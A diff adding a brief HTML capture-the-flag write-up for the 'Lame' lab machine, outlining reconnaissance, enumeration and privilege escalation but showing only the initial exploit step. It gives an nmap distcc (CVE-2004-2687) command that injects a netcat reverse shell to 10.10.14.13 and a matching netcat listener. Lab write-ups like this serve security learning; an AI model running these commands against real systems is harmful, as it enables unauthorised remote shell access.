@@ -1,0 +1,17 @@
+<html>
+    <head></head>
+    <div>
+        <h1>Lame WriteUP</h1>
+        <p>Steps are Reconnaissance, Enumeration, Privilege Escalation</p>
+        <br>
+        <p>Initial exploit: <br>
+            All we must do is send a reverse shell command in the username parameter and catch the shell.
+            </p>
+            <img src="imgs/lame1">
+            <br>
+        <p>nmap -Pn -n -p3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc 10.10.14.13 444 -e /bin/bash'" 10.10.10.3</p>
+            <br>
+            <p>sudo nc -nlvp 444<br>
+                 <br> 
+    </div>
+</html>
